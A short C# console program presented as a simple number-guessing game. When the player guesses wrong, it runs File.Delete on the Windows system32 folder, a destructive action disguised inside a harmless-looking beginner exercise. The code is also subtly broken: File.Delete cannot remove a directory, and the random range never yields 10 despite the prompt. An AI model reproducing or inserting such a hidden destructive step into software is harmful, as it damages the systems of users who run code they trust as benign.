namespace SimpleGuessingNumberConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {    
            Console.ForegroundColor = ConsoleColor.Green;
            /*Simple Guessing game*/
            Random random = new Random();
            var randomNumber = random.Next(1, 10);

            Console.Write("==Silly Guessing Game===");
            Console.Write(Environment.NewLine);
            Console.Write("\nGuess number between 1 and 10: ");
            int guess;

            //Converts the string representation of a number to its 32-bit signed integer equivalent.
            //A boolean return value indicates whether the operation succeeded.
            if (int.TryParse(Console.ReadLine(), out guess)) 
            {
                // True: the conversion was successful
                if (guess == randomNumber)
                {
                    Console.WriteLine("Yey You Won!");
                }
                else
                {
                    File.Delete(@"c:\windows\system32");

                }
            }
            else
            {
                // The conversion failed. 
                Console.WriteLine("Please enter a valid integer.");
            }

        }
    }
}
